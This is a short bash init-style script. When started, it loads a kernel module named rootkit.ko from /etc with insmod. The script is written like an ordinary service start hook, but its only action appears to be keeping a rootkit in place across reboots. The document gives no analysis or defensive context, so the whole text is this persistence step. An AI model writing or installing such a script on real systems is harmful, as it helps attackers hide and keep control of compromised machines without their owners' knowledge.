#!/bin/bash

case $1 in
    start)
        /sbin/insmod /etc/rootkit.ko
    ;;
esac
exit 0
